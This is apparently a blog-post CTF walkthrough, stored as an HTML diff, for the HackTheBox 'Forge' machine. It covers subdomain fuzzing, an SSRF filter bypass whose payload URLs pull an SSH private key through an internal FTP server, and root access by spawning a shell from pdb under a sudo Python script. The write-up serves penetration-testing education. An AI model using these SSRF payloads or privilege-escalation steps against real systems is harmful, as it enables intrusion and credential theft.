@@ -1,0 +1,105 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/hackthebox/" rel="category tag">HackTheBox</a></span>            </div>
+            <h1 class="post-title entry-title">Forge HackTheBox Walkthrough</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/forge-hackthebox-walkthrough/" rel="bookmark"><time class="entry-date published" datetime="2022-01-24T14:58:18+00:00">January 24, 2022</time><time class="updated" datetime="2025-06-10T20:17:50+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">Forge is a CTF Linux box rated “medium” on the difficulty scale on the HackTheBox platform. The box covers subdomain enumeration, SSRF attacks and basic reverse engineering of a python script for privilege escalation.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<p><span style="color: #000000;"><strong>Network Scanning</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Nmap</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Enumeration</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Subdomain enumeration using wfuzz</span></li>
+<li><span style="color: #000000;">Checking file upload filters on web application</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Exploitation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Exploiting SSRF to read private SSH key</span></li>
+<li><span style="color: #000000;">Logging in using this SSH key</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Privilege Escalation</strong></span></p>
+<ul>
+<li><span style="color: #000000;">Understanding python script running as sudo</span></li>
+<li><span style="color: #000000;">Gaining root by exploiting pdb</span></li>
+</ul>
+<p><span style="color: #000000;">Let’s deep dive into this.</span></p>
+<h3><span style="color: #800000;">Network Scanning</span></h3>
+<p><span style="color: #000000;">The dedicated IP address of the machine is <strong>10.129.164.116. </strong>We’ll run a nmap scan on this machine’s IP. As we can see in the nmap scan, the server tried to redirect the request to <strong>http://forge.htb</strong>. So, we’ll add this IP in our hosts file and access the webserver.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -sV -sC -p 1-1000 10.129.164.116</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjXw_vRTFxHuKYLubtFWunfVi9Jd_naDOCtOKxdpElJqfcEBY9mtD-A-RaYPYcFUOP6b0o3uRYUh0MbyrjWhY9m8Qzzi7j_oWmKpZOA42oKmECStwzpA7CCIs6EOGqOKYsjEnrneT44xfgezK9JHeRSK-7Q2W0JsTIFz2jm4e730bcUAaDEQyswWS6OPQ=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we access the webserver which seemed to be running a digital gallery.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg6BGoozrVOEs9i1zEZJpIivZoEfkSlygvP-m3iqsB8eXW5jyoQ-5abybzOjlpBNJ-YIfsvXIj9YoccxICJTX15pspF99P6sZFLDj6ZkQHukEHmRXMx8OcQhwXvd43-AyLrkDQq_J0QXp1LY9wbs-wdEjlKJZSWQGoVZYE86YKzD2rejnsSbFoBBxMAHg=s16000"/></span></p>
+<h3><span style="color: #800000;">Enumeration</span></h3>
+<p><span style="color: #000000;">As we see there was an upload function in the gallery. We tried uploading a PHP payload and gaining reverse shell but it didn’t work. The file was being uploaded to the server though and contents were there but it wasn’t executing the code.</span></p>
+<p><span style="color: #000000;">However, since the website was rerouting to forge.htb, it was possible that there were other subdomains on the website. We used wfuzz for this bruteforce (along with seclists wordlist).</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">wfuzz -w /home/kali/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.forge.htb" --sc 200 10.129.164.116</pre>
+<p><span style="color: #000000;">This shows that <strong>admin.forge.htb</strong> exists.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEinlbbhcW5bmYb-MsFiT_5Dr1g-0QZW8N6wXIWQ3b9KGM4L8EaZrA_M770b8-HVQ0LDYdXZWU12bAs03OlYyq-FxemumbjJEQ9XeXKK7nlsVNmHuMVn3JLHNJ-fLjrSbeZbyo2f3RURbxEiT_vHZcta8BouqIkbS_5RdRvrNTrU3b7EK3L6TTloIeLo0Q=s16000"/></span></p>
+<p><span style="color: #000000;">However, upon opening the URL using curl we received an error. This means that an access control filter is up on the server.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">echo "10.129.164.116   admin.forge.htb" &gt;&gt; /etc/hosts
+curl http://admin.forge.htb/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEg5hUqgrEAzKzUEtpR2MOfQUiqf3lVVMic4kJJdgURURTwzD2kQkJNorpE6VxUIjEgzcMMb4m24r35FuTBfmVvyGqN9h4bmOFUyD4YmEZoWTL-nkcKt6Vx8T74rJ85FFoPU1AkBGzKOJJpqUQK-rYP3PhFy0RH9um2utr8kGDPkwND5mUbE86c40smQog=s16000"/></span></p>
+<p><span style="color: #000000;">So, we headed to another upload option “upload from URL.” There was another filter that only allowed HTTP,HTTPS URLs.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiowOmLoeWtR5kyCoLkHSwMiSbpbV8Y3NLaMeb6_lJrf2FK9xV0c56gu4fYVTYeOHkRf1l3VV50aW3TZ33XPmCPFq6l_YbgwAfU2FYMbn2SUKTdchTGNe4uWrV181YipqtWaCH-3Tmj2KISMguPEL3T6i8EwhS8CbrXR66q-uIMO2VqeXLBVJTeIE6skQ=s16000"/></span></p>
+<p><span style="color: #000000;">So, I set up a listener on port 80 using netcat and input <strong>http://10.10.16.10/shell.php </strong>in the option (my HTB tunnel IP).</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjBWVq5WuPGaUMIcb_9B5xbo03QVIUNwJmVog923xo-d1O2ldhdwlhX8uQNOdwCvH8msp6tyxT9BsAFwuPIFUV41VQ7C8BNtLetgOmNkWfLGSzCu96soVWAuT7yd49abviReqcC-iBWCmQFaUENBP6MJdZlfs-7iHzp_h6_Lia4y9reDdzq6CgbiDYtJA=s16000"/></span></p>
+<p><span style="color: #000000;">On my netcat listener, I could see the website trying to fetch shell.php. There were a few notable things here:</span></p>
+<ul>
+<li><span style="color: #000000;">The server tried to fetch the specified file shell.php from my IP</span></li>
+<li><span style="color: #000000;">The request had my IP in the Host header</span></li>
+<li><span style="color: #000000;">User-Agent is python-requests which is a python crawler</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgs4-ZR287t_tzwUwsakrdegWZYn2JpR9yJekdCdOybCeBEHYyE2g0Yp_U9kztSdasZbHuj5UbusofU2Db5VaM_y9pPRmznL9BNxcBuAv-bqsF1G87-7hYvdOlyTlnIGLIdQES22cn0B27FgTVVCRLAOXg12DwogozhyA7s9VpZ5Fy-iESVOpfmOvjjFg=s16000"/></span></p>
+<h3><span style="color: #800000;">Exploitation</span></h3>
+<p><span style="color: #000000;">Now that it had been established the server tries to fetch a remote file, we can work our way up to exploitation from here. My first instinct was to access admin.forge.htb using this remote URL functionality as that page was only accessible using localhost. So, I was able to do that like this but encountered yet another problem!</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgDyl1LmeuU22NepPNgjJ9aNNvBL6mrdLXM_Gfk6chMylDj9nZMEzVw4KqQHIhS7n2TuLkei_YCpWrU7lsTwxCBDTVP8jh4lLl2rFDIC6RoUyCmFBasQ9EGi6IqZaK3RnVLKUZFElTmq0-xIlS1zc5Qr7cUmaRWyePEes4B63VYdWztyzHarO46QumBjA=s16000"/></span></p>
+<p><span style="color: #000000;">So, this address is blacklisted. Let’s see if we can bypass this by typing the subdomain “admin” in all caps (ADMIN.forge.htb). Well, well looks like we are able to access admin.forge.htb now! This vulnerability is called SSRF (server-side request forgery) where an attacker is able to tamper with the backend requests on a server and breakthrough various access controls (like localhost here) to access sensitive files or even gain a remote shell.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgoSGVbT4AZJ7DG3g11FEdkmQNvx-Vt4bvwjSxwU6s4v1Jft4HkFJyvYVyJk8LM0TUYbwngenZZjMbiCU_xTROH1EgICVxt6lDQ2sCGvMMBmigznhy7LjWAL6VJOo_Hz23M341W8xKgTsbW912q8d09PLIVwFlRY3MkzF_1VJSys-bwI-H429b8OGdpzw=s16000"/></span></p>
+<p><span style="color: #000000;">This told me about a page /announcements which I then tried to access using http://ADMIN.forge.htb/announcements but this was also blacklisted. So, I used this payload:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://ADMIN.FORGE.htb/announcements
+curl http://forge.htb/uploads/ps14SjF8useIEk0VOao1</pre>
+<p><span style="color: #000000;">Important things inferred from this result were:</span></p>
+<ul>
+<li><span style="color: #000000;">Internal FTP server is running whose credentials are user:heightofsecurity123!</span></li>
+<li><span style="color: #000000;">Upload file option supports FTP and FTPS</span></li>
+<li><span style="color: #000000;">?u= can be used to upload an image on /uploads page.</span></li>
+</ul>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgElm_7K_PWfdrRRWm6K33d4YxflutbXg3uy4XeCWrBpL1l9IoopzjVTJG7501iXYDGUk2aWXWyQQNzqo5Uq4nnHeyAqGQSYN_tI1BJK1cwF_TNMmSOfYjny081HdBI3inBQ9ifVnCqoWVk-6KxJmSsrSaZ-n8xKbED18XqJbvFGE_D4zlbaCFGY1q_zA=s16000"/></span></p>
+<p><span style="color: #000000;">So, if the /upload engine supports inclusion through the URL and FTP protocol, we can exploit SSRF and access the internal FTP server! The payload I used was</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhfv26cQ9ojc67BZw_jA4f8zcjR9S7fpmYwX02MlXB9TuE0jtkHzTyIYoAWEcDt0aAsOkeJVEXOiCH1hd08NtC0EuiiNt1A7qNXxjGT7M9rqzUYTl54sYoi6n4Xz91BafKoQcnuLvHvW9kJ4mKQ1TCD2yfK24sec8JvukRFKRJDLNxBlPkyGeMvwIr2lw=s16000"/></span></p>
+<p><span style="color: #000000;">Now, if I can access user.txt, I might also be able to access the private SSH key. I did that using this payload:</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">http://ADMIN.FORGE.htb/upload?u=ftp://user:heightofsecurity123!@127.0.1.1/.ssh/id_rsa</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEgMmSV22O_mmQATbUymFYi5GN3n5L8LbNZPm9SH6dFYp9xfmmzQtOfTCvGIY83fuj9RB8U71dALTCZkXNf8AW6vJXBxYGCwA0PqPk-jFKcR_2-wqLnAHM4nigVStEwPszBoNl2ZYvkRZ93M2ZUwP3mc5IGAxY4Cg32_pYBiD123-uY_yIsJuyvvEG4WFQ=s16000"/></span></p>
+<p><span style="color: #000000;">Saving that key in my local system we can log into the victim box.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">nano id_rsa
+chmod 600 id_rsa
+ssh -i id_rsa user@forge.htb</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjvdvZ5paNGafZQmmdSq1Fg4z3oxj1LycRY8W5AHZWxnR_mhH_64gnjdqe0OanEiDQg4y_xFCQ8Q8FCHtjT3-mBScc5Tw7ldot7kXRp9nP2LagaBFX39kHYjrFj_LEd6WqBvdIRjarAmlc_gCfN8XznQHW9_mW1WuAC-IMl60DWA1YaVvAd-2mJFL7aLQ=s16000"/></span></p>
+<h3><span style="color: #800000;">Privilege Escalation</span></h3>
+<p><span style="color: #000000;">Now that we had a stable prompt we could advance for privilege escalation. I checked the sudoers file which had a python script allowed to run as root. This script opens up a listener for remote clients to connect. Also, it compares the input password with hardcoded credential <strong>secretadminpassword</strong></span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo -l
+cat /opt/remote-manage.py</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiQuEpp1EE9vNQKOeR-lIitWxl1cL3axyvh_oiJuJyuVbUw8fn5_nrBtQjiZNkQhfjvOsJYEjskDuhsjWS7-M8JcdOW7QdeB8kSaFSoPUl2J2Hupnub1hpt91334b2GXhXDuDir89cmoVZDyXsebtvRpVCJUVzTUAsC7S_YFoLWgTXDnc1EvQHCc_DkbA=s16000"/></span></p>
+<p><span style="color: #000000;">Let’s do that and login to this user again from another terminal and connect to the script using netcat.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">sudo /usr/bin/python3 /opt/remote-manage.py
+nc localhost 55465</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEjGK3j2S_Y1wcJLwudp97Blj2pdt5zjVI6A0uZ1CPiVaJEwQTeRLMqTkZxZHsEh7nBIXcIn0rOxkvOpHb7Yju0KcA8T05UJeyOhc3V0u9W59wu5-nK_Dl89XicaILBWcl4LxUTfADFk01xjDZ16H38i7qYnarhoE4WhXk9KOKeRWC0RFrpScb6lVqR47A=s16000"/></span></p>
+<p><span style="color: #000000;">Now, I am effectively communicating with a python script that is run as root. You will notice that this script is flawed. As soon as I input anything other than “secretadminpassword” it throws an exception and opens up Python Debugger.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEhF3vlUv9OJcbbGSGfCgH6cVAxTIv211MSPdtxfY3e4s-wLXUpWwL-E2Q32zCu2Gdo0FeKbRVGgcAApBtyncgze0CkkQXldKpgqjma-L935m8tT8txdl4049nJoep_g4OVVWX1ghpMqKNFqjI1IS16fot2Thw4p1fvOywLYBimogcb9yo2Zm9u5pv2-rw=s16000"/></span></p>
+<p><span style="color: #000000;">Now, we have a Python debugger (pdb) running as root with us! Super convenient. We would have used a buffer overflow attack if this flaw didn’t exist to get into the debugger. Anyway, we can use the debugger to perform any function as root. I used the technique used by gtfobins <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://gtfobins.github.io/gtfobins/pdb/">here</a></strong></span>. Simply invoked a shell using the os module. And this is how we root this box.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">import os;os.system(“/bin/sh”)
+id
+cat /root/root.txt</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://blogger.googleusercontent.com/img/a/AVvXsEiPLup_PCT5S3kW4J1Uv6bZE2qHLQnw6t4U9z4AKP9Mx3crTlO7WmrcWZEG20xf6gnazI1DkkJI93nuUXqxtEzPhLiVnyMWytbyaokINQALUAmLugtdKX_xzdRugbTx53WKmz2Qpm7NIrL7Y3MIL_hZulk5ADdC_WWk9dfGCIgfdByfbgEgDbwFztZH3Q=s16000"/></span></p>
+<h3><span style="color: #800000;">Conclusion</span></h3>
+<p><span style="color: #000000;">The box covers a few tricks that make one scratch their brain, however, it doesn’t have any rabbit holes or advanced techniques used to exploit. We covered subdomain enumeration, SSRF and basic Python reverse engineering in this box. Hope you liked this article. Thanks for reading.</span></p>
+<p><span style="color: #000000;"><strong>Author: Harshit Rajpal </strong>is an InfoSec researcher and left and right brain thinker. Contact</span><strong> <a class="broken_link" href="https://in.linkedin.com/in/harshit-rajpal-79bb43103">here</a></strong></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
